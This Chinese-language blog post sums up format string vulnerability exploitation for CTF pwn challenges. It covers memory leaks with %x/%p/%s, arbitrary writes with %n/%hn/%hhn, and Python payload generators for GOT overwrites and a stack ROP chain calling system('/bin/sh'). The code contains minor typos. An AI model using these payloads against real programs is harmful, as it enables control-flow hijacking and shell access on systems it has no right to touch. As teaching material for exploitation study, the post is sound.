---
layout:     post
title:      "格式化字符串漏洞利用总结"
subtitle:   "多实践，勤总结"
date:       2018-1-16 09:26:24
author:     "Carter"
header-img: "img/post-bg-ios9-web.jpg"
tags:
    - pwn
---

### 写在前面

格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，即printf()函数并不能确定数据参数arg1,arg2...究竟在什么地方结束，也就是说，它不知道参数的个数。它只会根据format中的打印格式的数目依次打印堆栈中参数format后面地址的内容

在实际程序中，没有安全常识的程序员通常没有对用户输入进行有效地过滤，这些输入数据都作为数据传递给某些执行格式化操作的函数，如printf，sprintf，vprintf，vfprintf。恶意用户可以使用"%s","%x"来得到堆栈的数据，甚至可以通过"%n"来对任意地址进行读写，导致任意代码读写

好啦，说了这么多原理方面的东西，在ctf比赛中格式化字符串漏洞是出题者非常偏爱的漏洞种类，本篇文章就将对CTF比赛中fsb漏洞的基本利用思路和技巧做一个总结。如有错误或者可供改进的地方，欢迎小伙伴们指出~

### 一. 攻击能力

##### 1. 泄露内存数据
>泄露栈上内容
```shell
32bit：   %n$x : 返回栈上第（n+1）个参数的值
64bit：   %n$p 或者 %n$llx (64bit) ：返回栈上第（n-5）个参数的值
```

>泄露内存地址的内容
```shell
32bit：   %n$s：把栈上第n+1个参数的值作为地址，返回该地址内存的值
64bit：   %n$s：把栈上第n-5个参数的值作为地址，返回该地址内存的值
```

##### 2. 修改内存数据
```shell
 %***c%n$n：  把栈上第n+1个参数的值作为地址，将该地址的高32bit值改为 hex(***)
 %***c%n$hn： 把栈上第n+1个参数的值作为地址，将该地址的高16bit值改为 hex(***)
 %***c%n$hhn：把栈上第n+1个参数的值作为地址，将该地址的高8bit值改为 hex(***)
[64bit下，（n+1）变为（n-5）即可 ]
```

### 二. 任意内存写方法

#### 1. 基本思路

>基本知识说明

在后续的代码中，会多次用到此知识点，对此先进行一个解释

```html
对于 "%xxxc%11$hn%yyyc%12$hn" 的理解?
     当printf函数执行此参数时，实际上是向栈上地址所指向的内存写入在这之前打印出来的所有字符数量，所以到了%yyyc%12$hn的时候，前面已经打印了xxx个字符，因此在计算yyy的大小时需要考虑到已经打印了xxx个字符。
     一般情况下，我们可以把需要覆写的地址跟在此字符串后面，形如：
"%xxxc%11$hn%yyyc%12$hn" + padding + addr+ (addr+2)
     但也可以把地址放在前面：这种情况就要注意在计算xxx时，前面已经打印了8个字符(32bit下)，需要考虑进去
addr + (addr+2) +"%xxxc%11$hn%yyyc%12$hn"
```

>最容易想到的利用方式

想在addr_a这个地址写入b_context
 - 将a这个地址输入到栈上
 - 找到a这个地址是栈上第几个参数，假设为m
 - 如果直接 %b_contextc%m$n   （b_content是16进制数的10进制表示形式）

一般情况下 b_content 都是一个非常大的数，因此**在短时间内写完几乎不可能**；所以需要拆分，根据不同情况选择不同的拆分大小和方法，详情介绍请继续往下看“高级利用方法”介绍



#### 2. 高级利用方法
根据利用方式和场景的不同，以下将介绍两种不同常规的利用思路（附加实现代码）

##### 2.1  fsb漏洞只能触发一次

只能利用一次fsb漏洞，即可达到任意内存写。因为只能触发一次fsb漏洞，因此需要一次性把payload全部读入内存，这样做可能遇到的阻碍就是输入长度的限制。

根据把需要写入内容分割的细腻度的不同，本文提供一种现成工具实现 和 两种自定义代码实现，均可以实现通过利用一次fsb漏洞，达到任意地址写

###### 方法一：通过pwntools的fmtstr模块生成payload
```python
form pwn import *
payload2 = fmtstr_payload(7,{printf_got:system_addr})

//7是 %n$x 中的那个n
//printf_got是将要被覆写的地址
//system_addr是想要写入的数据
```


###### 方法二：将4字节地址分割成4个1字节写入

该方法是把4字节地址分成4个1字节，然后通过一次输入把参数全部布置到栈上，通过一次调用可以修改多处内存值。但是限制就是输入长度较长

>实现代码
```python
def generate_format(addr_value):
    payload = ''
    print_count = 0
    j = 0
    addr_part = ''
    for addr, value in addr_value:
        for i in range(4):
            one_byte = (value >> (8*i)) & 0xff
            #print one_byte
            payload += '%{0}c%{1}$hhn'.format((one_byte - print_count) % 0x100, 32 + i + j)
            print_count += (one_byte - print_count) % 0x100
            #print (one_byte - print_count) % 0x100
            addr_part += p32(addr + i)
        j += 4

    payload = payload.ljust(100, 'a')
    payload += addr_part
    return payload
```

>使用方法
1. 函数有一个参数，该参数是一个由元组组成的列表，类似于以下形式 [(1_got,111),(2_got,222)]
2. 使用时需要修改红色字部分，解释一下两处红色字如何修改：   图中两处注释解释了下面代码部分 100和32的由来
  ![1](https://raw.githubusercontent.com/carterMgj/blog_img/master/2018-1-6-fsb_summary/1.png)


###### 方法三：将4字节地址分割成2个2字节写入

该方法是把4字节地址分成2个2字节，然后通过一次输入把参数全部布置到栈上，通过一次调用只能修改一处内存值。相比方法一，该方法输入长度较短

>实现代码
```python
def fsb_write(write_data,target_addr):
	addr_high = write_data >> 16
	addr_low =  write_data & 0xffff
	print '[*]addr_high=%x' %addr_high
	print '[*]addr_low=%x' %addr_low
	if addr_low < addr_high:
		addr_high = addr_high - addr_low
		formats = '%%%dc%%13$hn%%%dc%%14$hn'%(addr_low,addr_high)
		formats = formats.ljust(28,'A')
		formats += p32(target_addr) + p32(target_addr+2)
	else:
		addr_low = addr_low - addr_high
		formats = '%%%dc%%13$hn%%%dc%%14$hn'%(addr_high,addr_low)
		formats = formats.ljust(28,'A')
		formats += p32(target_addr+2) + p32(target_addr)
	return formats
例如：
system_addr = 0x7f028db8e380
printf_got = 0x602018
input1 = fsb_write(system_addr,print_got)
printf(input1)
```

>使用方法
1. 该函数有两个参数，第一个参数是覆盖的数据，第二个参数是需要被该数据覆盖的地址
2. 使用的时候，需要修改函数中的红色字部分，根据gdb调试中，在调用printf函数时，我们的栈上的情况修改成相应的数值。
  如：我们需要修改的地址target_addr和target_addr+2 位于栈上的第14，15个参数，那么相应的红字就应该改为 13和14

##### 2.2  fsb漏洞能触发多次
在2.1中介绍的方法，其局限性在于如果函数参数长度有限制，则可能会出现对payload的截断导致利用不成功。但如果fsb漏洞可以利用多次，则可以通过其他的利用方法很好的回避这个问题。以上介绍的方法就是在64bit系统下，通过多次利用fsb漏洞，将任意的内容写入到栈上

>方法原理

![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2018-1-6-fsb_summary/3.png)

对于上图中的一个栈结构，我把它定位为“三级跳结构”，即假设栈地址存储的内容为x，x和x所指向的地址均在栈上

我们可以通过多次循环来将任意地址放到栈上地址target。在每次循环中会用到两次fsb，第一次通过fsb修改x内容为target地址，第二次通过fsb即可修改target地址的内容

>实现代码
```python
def fsb_write(addr,data):
	print 'addr = '+hex(addr)
	for i in range(3,-1,-1):      #分四次，一次16bit，改写64bit
       #因为都是栈地址，所以只需要修改最后4位地址，就可以在栈上任意地址写
		byte1 = (addr & 0xffff) + (2*i)     
		print 'byte1='+hex(byte1) 
		any_addr_write("%%%dc%%29$hn" % byte1)
		byte2 = data >> (16*i) & 0xffff
		print 'byte2='+hex(byte2) 
		if byte2!=0:	   
			printf("%%%dc%%32$hn" % byte2)
		else:
			printf('%32$hn')
例如：
stack_ret = 0x7ffd0bb6f408
pop_rdi = 0x400bc3
input1 = p64(pop_rdi) + p64(stack_ret+24) + p64(system_addr) + '/bin/sh\0'.ljust(8)
for i in range(0,len(input1)/8,1):
	fsb_write(stack_ret+i*8,u64(input1[i*8:(i+1)*8]))
```

>使用方法
1. 该种方法是一次只修改16bit数据，故需要多次触发fsb漏洞才能利用成功
2. 首先需要在栈上找到以下'三级跳'结构：即设该栈地址存储的内容为x，则y要求x本身和x所指向的地址均在栈上
  ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2018-1-6-fsb_summary/2.png)

>确定上图中'1'是第几个参数，'2'是第几个参数，如图中：
>   1 --> 栈上第24个参数 --> %29$hn
>   2 --> 栈上第27个参数 --> %32$hn

3. 修改代码红色部分为对应的数字： 29，32
4. 如果是修改其他函数（假定为func_x）的got表从而间接调用printf函数，则代码中printf函数应该修改为func_x

